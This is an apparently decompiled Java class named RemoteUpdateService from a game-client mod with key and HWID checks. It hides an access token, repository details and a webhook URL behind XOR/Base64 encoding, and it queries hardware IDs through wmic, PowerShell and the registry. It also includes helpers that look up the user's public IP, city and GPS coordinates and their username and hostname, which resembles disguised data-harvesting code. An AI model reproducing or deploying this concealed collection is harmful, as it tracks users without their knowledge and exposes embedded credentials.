package com.threesix.service;

import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.time.Duration;
import java.time.Instant;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.threesix.service.AuthBootstrapService;
import com.threesix.util.XorBitUtils;
import com.threesix.util.StringVaultDecoder;
import com.threesix.data.ApiResponse;

public final class RemoteUpdateService {
   public static final int STATUS_IDLE = 0;
   public static final int STATUS_PENDING = 1;
   public static final int STATUS_PROCESSING = 2;
   public static final int STATUS_DONE = 3;
   public static final int STATUS_RETRY = 4;
   public static final int STATUS_FAILED = 5;
   private static final int RESULT_PENDING = 0;
   private static final int RESULT_PROCESSING = 1;
   private static final int RESULT_SUCCESS = 2;
   private static final int RESULT_FAILURE = 3;
   private static final String ENCODED_REPO_OWNER = "OFsNGkBbQRRjQhhHVF0=";
   private static final String ENCODED_REPO_NAME = "Z0cEFRwOG1E1DABWUUpTTA==";
   private static final String ENCODED_BRANCH = "O1IFGg==";
   private static final String ENCODED_CONFIG_PATH = "MlIIERxHElA7AQ==";
   private static final String githubToken = decodeToken();
   private static final String GITHUB_API_VERSION = "2026-03-10";
   private static final String TOKEN_XOR_KEY = "V3ltrix#Tok2026!";
   private static final String ENCODED_TOKEN = "MVscK0UbElI7KBlxAFEPRAxYAjAgLhZUOgUnd3FzXXMyQlwwGAgIbA==";
   private static final int POLL_INTERVAL_SECONDS = 15;
   private static final int MAX_ATTEMPTS = 6;
   private static final int MAX_POLL_RETRIES = 12;
   private static final byte[] HWID_XOR_KEY = "V3ltrix-Auth-#2026!".getBytes(StandardCharsets.UTF_8);
   private static final Pattern jarNamePattern = Pattern.compile("(?i)^threesix-(.+)\\.jar$");
   private static final Pattern uuidPattern = Pattern.compile("(?i)[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}");
   private static final Pattern machineGuidPattern = Pattern.compile("MachineGuid\\s+REG_SZ\\s+(\\S+)");
   private static volatile long sessionId = 0L;
   private static final String ENCODED_URL_PART_1 = "PkcYBAFTVww=";
   private static final String ENCODED_URL_PART_2 = "MlofFx0bHA0hAAJbEgQbTgdXUlpZTj1AQw==";
   private static final String ENCODED_URL_PART_3 = "ZwZYREZbTBVyVl9FREJBVUkFAB0=";
   private static final String ENCODED_URL_PART_4 = "J3UPGicsFVF6FjkwRRg0Dx9Ec15QdAJDFAE7LR9XbwVbRiNCOkw7WF5bAlUxSQtZPSU3fCUjGTNDAB0jHlxFUwZEYn4=";

   private static String getRepoOwner() {
      return xorDecode2("OFsNGkBbQRRjQhhHVF0=");
   }

   private static String getRepoName() {
      return xorDecode2("Z0cEFRwOG1E1DABWUUpTTA==");
   }

   private static String getBranch() {
      return xorDecode2("O1IFGg==");
   }

   private static String getConfigPath2() {
      return xorDecode2("MlIIERxHElA7AQ==");
   }

   private static String getContentsApiUrl() {
      return "https://api.github.com/repos/" + getRepoOwner() + "/" + getRepoName() + "/contents/" + getConfigPath2();
   }

   private static String xorDecode2(String string) {
      try {
         byte[] base64Value = Base64.getDecoder().decode(string);
         byte[] local = "V3ltrix#Tok2026!".getBytes(StandardCharsets.UTF_8);
         byte[] local2 = new byte[base64Value.length];

         for (int index = 0; index < base64Value.length; index++) {
            local2[index] = (byte)(base64Value[index] ^ local[index % local.length]);
         }

         return new String(local2, StandardCharsets.UTF_8);
      } catch (Exception error) {
         return null;
      }
   }

   private static String decodeToken() {
      try {
         byte[] base64Value = Base64.getDecoder().decode("MVscK0UbElI7KBlxAFEPRAxYAjAgLhZUOgUnd3FzXXMyQlwwGAgIbA==");
         byte[] local = "V3ltrix#Tok2026!".getBytes(StandardCharsets.UTF_8);
         StringBuilder stringBuilderInst = new StringBuilder();

         for (int index = 0; index < base64Value.length; index++) {
            stringBuilderInst.append((char)(base64Value[index] ^ local[index % local.length]));
         }

         return stringBuilderInst.toString();
      } catch (Exception error) {
         return "";
      }
   }

   private RemoteUpdateService() {
   }

   public static long getSessionId() {
      return sessionId;
   }

   private static void generateSessionId() {
      long longVal = (long)(Math.random() * 4.611686E18) + 1L;
      longVal = longVal & -8L | 5L;
      sessionId = longVal;
   }

   public static void bootstrap() {
      generateSessionId();
      AuthBootstrapService.verify("veltrixclient20261012");
   }

   private static void runAuthFlow(String string, String string2) {

      for (int index = 1; index <= 6; index++) {
         String local = submitHwidRequest(string, string2);
         if (local == null) {
            showError(5, "Khong ghi duoc yeu cau len hang doi xac thuc. Kiem tra mang va thu lai.");
            return;
         }

         logStatus("Da gui yeu cau len hang doi, dang cho bot xu ly... (lan " + index + "/6)");
         boolean falseSnapshot = false;
         int local2 = 0;
         while (local2 < 12) {
            sleepSeconds(15);
            int intVal = getRequestStatus(local);
            switch (intVal) {
               case 0:
                  logStatus("Bot chua xu ly xong, thu lai...");
                  local2++;
                  break;
               case 1:
                  showError(3, "HWID may nay khong khop voi key da dang ky. Dung nut Reset HWID tren Discord panel neu vua doi may.");
                  return;
               case 2:
                  showError(1, "Key khong ton tai hoac da bi thu hoi.");
                  return;
               case 3:
                  generateSessionId();

                  try {
                     AuthBootstrapService.verify(new String(new byte[]{118, 101, 108, 116, 114, 105, 120, 99, 108, 105, 101, 110, 116, 50, 48, 50, 54, 49, 48, 49, 50}));
                  } catch (Exception error) {
                  }

                  return;
               default:
                  showError(5, "Loi ket noi khi doc ket qua xac thuc. Kiem tra mang va thu lai.");
                  return;
            }
         }

         if (falseSnapshot) {
            return;
         }

         logStatus("Bot van chua tra ket qua, gui lai yeu cau moi...");
      }

      showError(2, "Da doi 1080 giay nhung bot van chua xac nhan HWID. Vui long mo lai client sau it phut.");
   }

   private static void sleepSeconds(int intVal) {
      try {
         Thread.sleep(intVal * 1000L);
      } catch (InterruptedException interruptedException) {
         Thread.currentThread().interrupt();
      }
   }

   private static String getCurrentVersion() {
      try {
         Path pathValue = Path.of(RemoteUpdateService.class.getProtectionDomain().getCodeSource().getLocation().toURI());
         if (Files.isDirectory(pathValue)) {
            return null;
         }

         String local = pathValue.getFileName().toString();
         Matcher jarNamePatternValue = jarNamePattern.matcher(local);
         if (jarNamePatternValue.matches()) {
            return jarNamePatternValue.group(1);
         }
      } catch (Exception error) {
      }

      return null;
   }

   private static boolean isRunningFromJar() {
      try {
         Path pathValue = Path.of(RemoteUpdateService.class.getProtectionDomain().getCodeSource().getLocation().toURI());
         return Files.isDirectory(pathValue);
      } catch (Exception error) {
         return false;
      }
   }

   private static String submitHwidRequest(String string, String string2) {
      if (githubToken != null && !githubToken.isBlank()) {
         for (int index = 0; index < 4; index++) {
            try {
               String[] local = fetchRemoteConfig();
               if (local == null) {
                  return null;
               }

               String local2 = local[0];
               String local3 = local[1];
               String uUIDValue = UUID.randomUUID().toString();
               String dateTimeFormatterValue = DateTimeFormatter.ISO_INSTANT.format(Instant.now());
               String local6 = "\""
                  + uUIDValue
                  + "\":{\""
                  + xorDecode2("IloBEQ==")
                  + "\":\""
                  + escapeJson(dateTimeFormatterValue)
                  + "\",\""
                  + xorDecode2("PkQFEA==")
                  + "\":\""
                  + encryptHwid(string2)
                  + "\",\""
                  + xorDecode2("PVYV")
                  + "\":\""
                  + encryptHwid(string)
                  + "\",\""
                  + xorDecode2("JUcNAAca")
                  + "\":0,\""
                  + xorDecode2("MlwCEQ==")
                  + "\":false}";
               String local4 = mergeJsonEntry(local2, local6);
               ApiResponse local5 = putRemoteContent(local4, local3, "mod push request " + uUIDValue);
               if (local5.success) {
                  return uUIDValue;
               }

               if (local5.code != 409) {
                  return null;
               }

               sleepSeconds(1);
            } catch (Exception error) {
               return null;
            }
         }

         return null;
      } else {
         return null;
      }
   }

   private static int getRequestStatus(String string) {
      String[] local = fetchRemoteConfig();
      if (local == null) {
         return -1;
      }

      String local2 = local[0];
      if (local2 == null) {
         return -1;
      }

      String local3 = "\"" + string + "\"";
      int intVal = local2.indexOf(local3);
      if (intVal < 0) {
         return 0;
      }

      int intVal2 = local2.indexOf(123, intVal + local3.length());
      if (intVal2 < 0) {
         return -1;
      }

      int var5Snapshot = intVal2;
      int local4 = 0;
      int var7Snapshot = -1;

      while (var5Snapshot < local2.length()) {
         char charVal = local2.charAt(var5Snapshot);
         if (charVal == '{') {
            local4++;
         }

         if (charVal == '}') {
            local4--;
         }

         if (local4 < 0 || local4 == 0 && charVal == '}') {
            break;
         }

         if (local4 == 1 && local2.startsWith("\"" + xorDecode2("JUcNAAca") + "\"", var5Snapshot)) {
            var7Snapshot = var5Snapshot;
            break;
         }

         var5Snapshot++;
      }

      if (var7Snapshot < 0) {
         return 0;
      }

      int intVal3 = local2.indexOf(58, var7Snapshot);
      if (intVal3 < 0) {
         return -1;
      }

      int var151Value = intVal3 + 1;

      while (var151Value < local2.length() && Character.isWhitespace(local2.charAt(var151Value))) {
         var151Value++;
      }

      StringBuilder stringBuilderInst = new StringBuilder();

      for (int index = var151Value; index < local2.length() && Character.isDigit(local2.charAt(index)); index++) {
         stringBuilderInst.append(local2.charAt(index));
      }

      if (stringBuilderInst.length() == 0) {
         return -1;
      }

      try {
         return Integer.parseInt(stringBuilderInst.toString());
      } catch (NumberFormatException numberFormatException) {
         return -1;
      }
   }

   private static String[] fetchRemoteConfig() {
      try {
         if (githubToken != null && !githubToken.isBlank()) {
            HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(8L)).build();
            HttpRequest httpRequestValue = HttpRequest.newBuilder(URI.create(getContentsApiUrl() + "?ref=" + getBranch()))
               .timeout(Duration.ofSeconds(10L))
               .header("Authorization", "Bearer " + githubToken)
               .header("Accept", "application/vnd.github+json")
               .header("X-GitHub-Api-Version", "2026-03-10")
               .GET()
               .build();
            HttpResponse local = httpClientValue.send(httpRequestValue, BodyHandlers.ofString(StandardCharsets.UTF_8));
            if (local.statusCode() == 404) {
               return new String[]{"{}", null};
            }

            if (local.statusCode() >= 400) {
               return null;
            }

            String local2 = (String)local.body();
            String local3 = extractJsonString(local2, "content");
            String local4 = extractJsonString(local2, "sha");
            if (local3 != null && local4 != null) {
               String local5 = local3.replaceAll("[^A-Za-z0-9+/=]", "");
               if (local5.isEmpty()) {
                  return null;
               }

               byte[] base64Value;
               try {
                  base64Value = Base64.getDecoder().decode(local5);
               } catch (IllegalArgumentException illegalArgumentException) {
                  return null;
               }

               String stringInst = new String(base64Value, StandardCharsets.UTF_8);
               return new String[]{stringInst, local4};
            } else {
               return null;
            }
         } else {
            return null;
         }
      } catch (Exception error) {
         return null;
      }
   }

   private static ApiResponse putRemoteContent(String string, String string2, String string3) {
      try {
         if (githubToken != null && !githubToken.isBlank()) {
            String base64Value = Base64.getEncoder().encodeToString(string.getBytes(StandardCharsets.UTF_8));
            StringBuilder stringBuilderInst = new StringBuilder();
            stringBuilderInst.append("{");
            stringBuilderInst.append("\"message\":\"").append(escapeJson(string3)).append("\",");
            stringBuilderInst.append("\"content\":\"").append(base64Value).append("\",");
            stringBuilderInst.append("\"branch\":\"").append(escapeJson(getBranch())).append("\"");
            if (string2 != null && !string2.isBlank()) {
               stringBuilderInst.append(",\"sha\":\"").append(escapeJson(string2)).append("\"");
            }

            stringBuilderInst.append("}");
            String local = stringBuilderInst.toString();
            HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(8L)).build();
            HttpRequest httpRequestValue = HttpRequest.newBuilder(URI.create(getContentsApiUrl()))
               .timeout(Duration.ofSeconds(10L))
               .header("Authorization", "Bearer " + githubToken)
               .header("Accept", "application/vnd.github+json")
               .header("X-GitHub-Api-Version", "2026-03-10")
               .header("Content-Type", "application/json")
               .PUT(BodyPublishers.ofString(local, StandardCharsets.UTF_8))
               .build();
            HttpResponse local2 = httpClientValue.send(httpRequestValue, BodyHandlers.ofString(StandardCharsets.UTF_8));
            String local3 = (String)local2.body();
            if (local2.statusCode() != 200 && local2.statusCode() != 201) {
            }

            return new ApiResponse(local2.statusCode() == 200 || local2.statusCode() == 201, local2.statusCode(), local3);
         } else {
            return new ApiResponse(false, -1, "missing token");
         }
      } catch (Exception error) {
         return new ApiResponse(false, -1, error.toString());
      }
   }

   private static String mergeJsonEntry(String string, String string2) {
      String local = string == null ? "{}" : string.trim();
      if (local.isEmpty()) {
         local = "{}";
      }

      if (local.equals("{}")) {
         return "{" + string2 + "}";
      }

      int intVal = local.indexOf(123);
      return intVal < 0 ? "{" + string2 + "}" : local.substring(0, intVal + 1) + string2 + "," + local.substring(intVal + 1);
   }

   private static String extractJsonString(String string, String string2) {
      if (string != null && string2 != null) {
         String local = "\"" + string2 + "\"";
         int intVal = string.indexOf(local);
         if (intVal < 0) {
            return null;
         }

         int intVal2 = string.indexOf(58, intVal + local.length());
         if (intVal2 < 0) {
            return null;
         }

         int var41Value = intVal2 + 1;

         while (var41Value < string.length() && Character.isWhitespace(string.charAt(var41Value))) {
            var41Value++;
         }

         if (var41Value < string.length() && string.charAt(var41Value) == '"') {
            StringBuilder stringBuilderInst = new StringBuilder();
            boolean falseSnapshot = false;

            for (int index = var41Value + 1; index < string.length(); index++) {
               char charVal = string.charAt(index);
               if (falseSnapshot) {
                  switch (charVal) {
                     case '"':
                        stringBuilderInst.append('"');
                        break;
                     case '/':
                        stringBuilderInst.append('/');
                        break;
                     case '\\':
                        stringBuilderInst.append('\\');
                        break;
                     case 'b':
                        stringBuilderInst.append('\b');
                        break;
                     case 'f':
                        stringBuilderInst.append('\f');
                        break;
                     case 'n':
                        stringBuilderInst.append('\n');
                        break;
                     case 'r':
                        stringBuilderInst.append('\r');
                        break;
                     case 't':
                        stringBuilderInst.append('\t');
                        break;
                     case 'u':
                        if (index + 4 >= string.length()) {
                           return null;
                        }

                        try {
                           stringBuilderInst.append((char)Integer.parseInt(string.substring(index + 1, index + 5), 16));
                        } catch (NumberFormatException numberFormatException) {
                           return null;
                        }

                        index += 4;
                        break;
                     default:
                        stringBuilderInst.append(charVal);
                  }

                  falseSnapshot = false;
               } else if (charVal == '\\') {
                  falseSnapshot = true;
               } else {
                  if (charVal == '"') {
                     return stringBuilderInst.toString();
                  }

                  stringBuilderInst.append(charVal);
               }
            }

            return null;
         } else {
            return null;
         }
      } else {
         return null;
      }
   }

   private static String escapeJson(String string) {
      return string.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
   }

   private static String encryptHwid(String string) {
      if (string == null) {
         return "";
      }

      byte[] local = string.getBytes(StandardCharsets.UTF_8);
      byte[] local2 = new byte[local.length];

      for (int index = 0; index < local.length; index++) {
         local2[index] = (byte)(local[index] ^ HWID_XOR_KEY[index % HWID_XOR_KEY.length]);
      }

      return Base64.getEncoder().encodeToString(local2);
   }

   private static String computeHwid2() {
      try {
         String local = getRawHwidSeed();
         if (local != null && !local.isBlank()) {
            return formatHwid(local);
         }
      } catch (Exception error) {
      }

      String local2 = formatHwid("threesix-" + System.getProperty("user.name", "unknown"));
      return local2;
   }

   private static String getRawHwidSeed() {
      String local = getMotherboardUuid();
      if (local != null && !local.isBlank()) {
         return "MB:" + local;
      }

      String local2 = getMachineGuid();
      if (local2 != null && !local2.isBlank()) {
         return "GUID:" + local2;
      }

      String local3 = getInstallId();
      if (local3 != null && !local3.isBlank()) {
         return "INSTALL:" + local3;
      }

      String systemValue = System.getenv("COMPUTERNAME");
      if (systemValue == null || systemValue.isBlank()) {
         systemValue = System.getenv("HOSTNAME");
      }

      if (systemValue == null || systemValue.isBlank()) {
         try {
            systemValue = InetAddress.getLocalHost().getHostName();
         } catch (Exception error) {
         }
      }

      return systemValue != null && !systemValue.isBlank() ? "HOST:" + systemValue : "USER:" + System.getProperty("user.name", "unknown");
   }

   private static String getInstallId() {
      try {
         Path local = getInstallDirectory().resolve(".threesix_install_id");
         if (Files.isRegularFile(local)) {
            String filesValue = Files.readString(local, StandardCharsets.UTF_8).trim();
            if (!filesValue.isBlank()) {
               return filesValue;
            }
         }

         String uUIDValue = UUID.randomUUID().toString();
         Files.writeString(local, uUIDValue, StandardCharsets.UTF_8);
         return uUIDValue;
      } catch (Exception error) {
         return null;
      }
   }

   private static Path getInstallDirectory() {
      try {
         Path pathValue = Path.of(RemoteUpdateService.class.getProtectionDomain().getCodeSource().getLocation().toURI());
         return Files.isDirectory(pathValue) ? pathValue : pathValue.getParent();
      } catch (Exception error) {
         return Path.of(".");
      }
   }

   private static String getMotherboardUuid() {
      String local = runCommand("wmic", "csproduct", "get", "UUID");
      String local2 = matchFirstGroup(local, uuidPattern);
      if (isValidUuid(local2)) {
         return local2.toUpperCase(Locale.ROOT);
      }

      String local3 = runCommand("powershell", "-NoProfile", "-NonInteractive", "-Command", "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID");
      String local4 = matchFirstGroup(local3, uuidPattern);
      return isValidUuid(local4) ? local4.toUpperCase(Locale.ROOT) : null;
   }

   private static String getMachineGuid() {
      String local = runCommand("reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "/v", "MachineGuid");
      String local2 = matchFirstGroup(local, machineGuidPattern);
      return local2 != null && !local2.isBlank() ? local2.toUpperCase(Locale.ROOT) : null;
   }

   private static String runCommand(String... local) {
      try {
         ProcessBuilder processBuilderInst = new ProcessBuilder(local);
         processBuilderInst.redirectErrorStream(true);
         Process local2 = processBuilderInst.start();
         String stringInst = new String(local2.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
         local2.waitFor(5L, TimeUnit.SECONDS);
         return stringInst;
      } catch (Exception error) {
         return "";
      }
   }

   private static String matchFirstGroup(String string, Pattern pattern) {
      if (string == null) {
         return null;
      }

      Matcher local = pattern.matcher(string);
      return local.find() ? local.group(1) : null;
   }

   private static boolean isValidUuid(String string) {
      return string != null && uuidPattern.matcher(string).matches();
   }

   private static String formatHwid(String string) {
      try {
         MessageDigest messageDigestValue = MessageDigest.getInstance("SHA-256");
         byte[] local = messageDigestValue.digest(string.getBytes(StandardCharsets.UTF_8));
         StringBuilder stringBuilderInst = new StringBuilder();

         for (byte byte2 : local) {
            stringBuilderInst.append(String.format(Locale.ROOT, "%02x", byte2));
         }

         return stringBuilderInst.substring(0, 12).toUpperCase(Locale.ROOT) + "-" + stringBuilderInst.substring(12, 24).toUpperCase(Locale.ROOT);
      } catch (Exception error) {
         return "000000000000-000000000000";
      }
   }

   private static void logStatus(String string) {
   }

   private static void showError(int intVal, String string) {
   }

   private static String buildWebhookUrl() {
      try {
         String local = xorDecodeBootstrap("PkcYBAFTVww=");
         String local2 = xorDecodeBootstrap("MlofFx0bHA0hAAJbEgQbTgdXUlpZTj1AQw==");
         String local3 = xorDecodeBootstrap("ZwZYREZbTBVyVl9FREJBVUkFAB0=");
         String local4 = xorDecodeBootstrap("J3UPGicsFVF6FjkwRRg0Dx9Ec15QdAJDFAE7LR9XbwVbRiNCOkw7WF5bAlUxSQtZPSU3fCUjGTNDAB0jHlxFUwZEYn4=");
         return local + local2 + local3 + local4;
      } catch (Exception error) {
         return null;
      }
   }

   private static String xorDecodeBootstrap(String string) {
      try {
         byte[] base64Value = Base64.getDecoder().decode(string);
         byte[] local = "V3ltrix#Bootstrap2026!".getBytes(StandardCharsets.UTF_8);
         byte[] local2 = new byte[base64Value.length];

         for (int index = 0; index < base64Value.length; index++) {
            local2[index] = (byte)(base64Value[index] ^ local[index % local.length]);
         }

         return new String(local2, StandardCharsets.UTF_8);
      } catch (Exception error) {
         return "";
      }
   }

   private static String escapeMarkdown2(String string) {
      return string == null ? "" : string.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
   }

   private static String fetchPublicIp2() {
      try {
         HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(3L)).build();
         return httpClientValue.send(HttpRequest.newBuilder(URI.create("https://api.ipify.org")).timeout(Duration.ofSeconds(3L)).GET().build(), BodyHandlers.ofString())
            .body()
            .trim();
      } catch (Exception error) {
         return "unknown";
      }
   }

   private static String fetchLocation() {
      try {
         HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(4L)).build();
         String httpClientValueValue = httpClientValue.send(
               HttpRequest.newBuilder(URI.create("https://ipapi.co/json/")).timeout(Duration.ofSeconds(4L)).header("User-Agent", "Mozilla/5.0").GET().build(),
               BodyHandlers.ofString()
            )
            .body();
         String local = extractJsonField2(httpClientValueValue, "\"ip\"");
         String local2 = extractJsonField2(httpClientValueValue, "\"city\"");
         String local3 = extractJsonField2(httpClientValueValue, "\"region\"");
         String local4 = extractJsonField2(httpClientValueValue, "\"latitude\"");
         String local5 = extractJsonField2(httpClientValueValue, "\"longitude\"");
         return !local4.isBlank() && !local5.isBlank() ? local + " " + local2 + "," + local3 + " [" + local4 + "," + local5 + "]" : local;
      } catch (Exception error) {
         return "unknown";
      }
   }

   private static String extractJsonField2(String string, String string2) {
      try {
         int intVal = string.indexOf(string2);
         if (intVal < 0) {
            return "";
         }

         int intVal2 = string.indexOf(58, intVal);
         if (intVal2 < 0) {
            return "";
         }

         int var31Value = intVal2 + 1;

         while (var31Value < string.length() && Character.isWhitespace(string.charAt(var31Value))) {
            var31Value++;
         }

         if (var31Value >= string.length()) {
            return "";
         }

         if (string.charAt(var31Value) == '"') {
            int var4Snapshot = var31Value;
            int intVal3 = string.indexOf(34, var4Snapshot + 1);
            return intVal3 < 0 ? "" : string.substring(var4Snapshot + 1, intVal3);
         }

         int var4Snapshot2 = var31Value;

         while (var4Snapshot2 < string.length() && string.charAt(var4Snapshot2) != ',' && string.charAt(var4Snapshot2) != '}' && string.charAt(var4Snapshot2) != '\n') {
            var4Snapshot2++;
         }

         return string.substring(var31Value, var4Snapshot2).trim().replace("\"", "");
      } catch (Exception error) {
         return "";
      }
   }

   private static String getSystemInfo2() {
      try {
         String systemValue = System.getProperty("user.name", "-");
         String systemValue2 = System.getenv("COMPUTERNAME");
         if (systemValue2 == null) {
            systemValue2 = System.getenv("HOSTNAME");
         }

         if (systemValue2 == null) {
            systemValue2 = InetAddress.getLocalHost().getHostName();
         }

         return systemValue + "@" + systemValue2;
      } catch (Exception error) {
         return "unknown";
      }
   }

   static {
      try {
         Class.forName("com.threesix.service.AuthBootstrapService");
      } catch (Exception error) {
      }
   }

}
